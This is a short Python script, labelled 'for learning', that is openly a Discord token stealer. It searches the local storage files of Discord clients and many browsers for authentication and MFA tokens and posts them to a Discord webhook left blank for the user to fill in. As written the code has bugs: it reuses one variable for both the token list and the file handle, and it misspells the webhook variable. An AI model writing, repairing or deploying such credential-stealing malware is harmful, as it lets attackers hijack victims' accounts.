# MADE BY MUVVSA FOR LEARNING!


import os
import re
import requests as req

wbh = "" # Discord Webhook to pull tokens

def grabber():
    pp = {
        "Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
        "Discord Canary": os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
        "Discord PTB": os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
        "Lightcord": os.getenv("APPDATA") + "\\Lightcord\\Local Storage\\leveldb",
        "Opera": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        "Opera GX": os.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
        "Opera Developer": os.getenv("APPDATA") + "\\Opera Software\\Opera Developer\\Local Storage\\leveldb",
        "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        "Brave Beta": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default\\Local Storage\\leveldb",
        "Brave Dev": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Dev\\User Data\\Default\\Local Storage\\leveldb",
        "Yandex": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
        "Edge": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        "Edge Beta": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Beta\\User Data\\Default\\Local Storage\\leveldb",
        "Edge Dev": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Dev\\User Data\\Default\\Local Storage\\leveldb",
        "Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        "Chrome Beta": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome Beta\\User Data\\Default\\Local Storage\\leveldb",
        "Chrome Dev": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome Dev\\User Data\\Default\\Local Storage\\leveldb",
        "Chromium": os.getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb"
    }

    token = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    mfa = re.compile(r"mfa\.[\w-]{84}")

    f = []
    for name, path in pp.items():
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file), 'r', errors="ignore") as f:
                    c = f.read()
                    f += token.findall(c)
                    f += mfa.findall(c)
            except:
                continue
    return list(set(f))

def st(tokens):
    if not tokens:
        return
    c = "**🎯 Token Grabber**\n" + "\n".join(tokens)
    try:
        req.post(whb, data={"content": c})
    except Exception as er:
        print("FATAL ERROR:", er)

if __name__ == "__main__":
    tokens = grabber()
    st(tokens)
